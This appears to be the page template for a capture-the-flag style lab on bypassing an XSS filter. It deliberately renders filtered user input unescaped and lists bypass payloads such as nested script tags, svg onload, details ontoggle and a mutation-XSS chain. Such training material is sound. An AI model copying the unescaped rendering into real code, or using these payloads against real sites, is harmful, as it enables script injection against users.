<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XSS Filter Bypass - EliteHackLab</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav">
    <div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div>
    <div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/xss"><i class="fas fa-flask"></i> XSS Labs</a></div>
  </nav>
  <div class="lab-container">
    <div class="lab-header">
      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/xss">XSS</a> / Filter Bypass</div>
      <h1>🎭 XSS Filter Bypass</h1>
      <div class="lab-info">
        <span class="lab-tag difficulty-hard">Hard</span>
        <span class="lab-tag points"><i class="fas fa-star"></i> 10 pts</span>
      </div>
    </div>

    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>The server applies a filter that removes &lt;script&gt; tags, javascript: protocol, and event handlers. Bypass the filter to execute JavaScript.</p>
    </div>

    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> Filtered Input</h2>
      <form method="GET" class="vulnerable-form">
        <label>Input (filtered then rendered):</label>
        <input type="text" name="input" value="<%= input %>" placeholder="Try to bypass the filter..." autocomplete="off">
        <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
      </form>

      <% if (filtered) { %>
        <div class="result-box">
          <p style="color:var(--text-secondary);">Filtered output:</p>
          <div><%- filtered %></div>
        </div>
        <div class="hint-box">
          <p><strong>Original:</strong> <%= input %></p>
          <p><strong>After filter:</strong> <%= filtered %></p>
        </div>
      <% } %>

      <div class="code-block">
Filter rules applied:
- Removes: &lt;script&gt; and &lt;/script&gt;
- Removes: javascript:
- Removes: on*= (event handlers)

Bypass ideas:
- &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;  (double encoding)
- &lt;img src=x oNeRrOr=alert(1)&gt;  (case won't work here)
- &lt;svg/onload=alert(1)&gt;  (no space before event)
- &lt;details open ontoggle=alert(1)&gt;  (different event)
- &lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id="&lt;/textarea&gt;&lt;img src=x onerror=alert(1)//"&gt;
      </div>
    </div>

    <div class="flag-submit">
      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('xss-reflected', 'flagInput_xss_f', 'flagResult_xss_f'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
        <input type="text" id="flagInput_xss_f" placeholder="FLAG{...}" autocomplete="off">
        <button type="submit" class="btn">Submit</button>
      </form>
      <div id="flagResult_xss_f" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
</body>
</html>
